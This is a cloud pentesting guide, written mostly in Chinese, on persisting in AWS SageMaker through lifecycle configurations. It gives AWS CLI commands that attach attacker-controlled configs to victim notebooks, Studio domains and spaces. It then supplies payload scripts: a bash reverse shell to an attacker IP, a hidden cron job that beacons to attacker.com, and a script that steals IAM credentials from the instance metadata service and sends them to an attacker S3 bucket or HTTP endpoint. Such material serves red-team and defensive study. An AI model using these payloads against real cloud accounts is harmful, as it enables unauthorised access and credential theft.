# Aws Sagemaker Persistence

{{#include ../../../banners/hacktricks-training.md}}

## Overview of Persistence Techniques

本节概述了通过滥用生命周期配置（LCCs）在SageMaker中获得持久性的几种方法，包括反向Shell、定时任务、通过IMDS进行凭证盗窃和SSH后门。这些脚本以实例的IAM角色运行，并且可以在重启后保持有效。大多数技术需要出站网络访问，但如果环境处于“仅VPC”模式，使用AWS控制平面上的服务仍然可以成功。
#### Note: SageMaker notebook instances are essentially managed EC2 instances configured specifically for machine learning workloads.

## Required Permissions
* Notebook Instances:
```
sagemaker:CreateNotebookInstanceLifecycleConfig
sagemaker:UpdateNotebookInstanceLifecycleConfig
sagemaker:CreateNotebookInstance
sagemaker:UpdateNotebookInstance
```
* Studio Applications:
```
sagemaker:CreateStudioLifecycleConfig
sagemaker:UpdateStudioLifecycleConfig
sagemaker:UpdateUserProfile
sagemaker:UpdateSpace
sagemaker:UpdateDomain
```
## 设置笔记本实例的生命周期配置

### 示例 AWS CLI 命令：
```bash
# Create Lifecycle Configuration*

aws sagemaker create-notebook-instance-lifecycle-config \
--notebook-instance-lifecycle-config-name attacker-lcc \
--on-start Content=$(base64 -w0 reverse_shell.sh)


# Attach Lifecycle Configuration to Notebook Instance*

aws sagemaker update-notebook-instance \
--notebook-instance-name victim-instance \
--lifecycle-config-name attacker-lcc
```
## 在 SageMaker Studio 上设置生命周期配置

生命周期配置可以在不同级别和不同应用类型的 SageMaker Studio 中附加。

### Studio 域级别（所有用户）
```bash
# Create Studio Lifecycle Configuration*

aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-studio-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)


# Apply LCC to entire Studio Domain*

aws sagemaker update-domain --domain-id <DOMAIN_ID> --default-user-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
### Studio Space Level (个人或共享空间)
```bash
# Update SageMaker Studio Space to attach LCC*

aws sagemaker update-space --domain-id <DOMAIN_ID> --space-name <SPACE_NAME> --space-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
## Studio 应用程序生命周期配置的类型

生命周期配置可以具体应用于不同的 SageMaker Studio 应用程序类型：
* JupyterServer: 在 Jupyter 服务器启动期间运行脚本，适合用于持久性机制，如反向 shell 和 cron 作业。
* KernelGateway: 在内核网关应用启动期间执行，适用于初始设置或持久访问。
* CodeEditor: 应用于代码编辑器 (Code-OSS)，启用在代码编辑会话开始时执行的脚本。

### 每种类型的示例命令：

### JupyterServer
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-jupyter-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)
```
### KernelGateway
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-kernelgateway-lcc \
--studio-lifecycle-config-app-type KernelGateway \
--studio-lifecycle-config-content $(base64 -w0 kernel_persist.sh)
```
### 代码编辑器
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-codeeditor-lcc \
--studio-lifecycle-config-app-type CodeEditor \
--studio-lifecycle-config-content $(base64 -w0 editor_persist.sh)
```
### 关键信息：
* 在域或空间级别附加LCC会影响范围内的所有用户或应用程序。
* 需要更高的权限（sagemaker:UpdateDomain, sagemaker:UpdateSpace），通常在空间级别比在域级别更可行。
* 网络级别的控制（例如，严格的出口过滤）可以防止成功的反向Shell或数据外泄。

## 通过生命周期配置进行反向Shell

SageMaker生命周期配置（LCC）在笔记本实例启动时执行自定义脚本。具有权限的攻击者可以建立持久的反向Shell。

### 有效载荷示例：
```
#!/bin/bash
ATTACKER_IP="<ATTACKER_IP>"
ATTACKER_PORT="<ATTACKER_PORT>"
nohup bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &
```
## 通过生命周期配置的 Cron 作业持久性

攻击者可以通过 LCC 脚本注入 cron 作业，确保恶意脚本或命令的定期执行，从而实现隐秘的持久性。

### 有效载荷示例：
```
#!/bin/bash
PAYLOAD_PATH="/home/ec2-user/SageMaker/.local_tasks/persist.py"
CRON_CMD="/usr/bin/python3 $PAYLOAD_PATH"
CRON_JOB="*/30 * * * * $CRON_CMD"

mkdir -p /home/ec2-user/SageMaker/.local_tasks
echo 'import os; os.system("curl -X POST http://attacker.com/beacon")' > $PAYLOAD_PATH
chmod +x $PAYLOAD_PATH

(crontab -u ec2-user -l 2>/dev/null | grep -Fq "$CRON_CMD") || (crontab -u ec2-user -l 2>/dev/null; echo "$CRON_JOB") | crontab -u ec2-user -
```
## 通过 IMDS (v1 & v2) 进行凭证外泄

生命周期配置可以查询实例元数据服务 (IMDS) 以检索 IAM 凭证并将其外泄到攻击者控制的位置。

### 有效载荷示例：
```bash
#!/bin/bash
ATTACKER_BUCKET="s3://attacker-controlled-bucket"
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME > /tmp/creds.json

# Exfiltrate via S3*

aws s3 cp /tmp/creds.json $ATTACKER_BUCKET/$(hostname)-creds.json

# Alternatively, exfiltrate via HTTP POST*

curl -X POST -F "file=@/tmp/creds.json" http://attacker.com/upload
```
{{#include ../../../banners/hacktricks-training.md}}
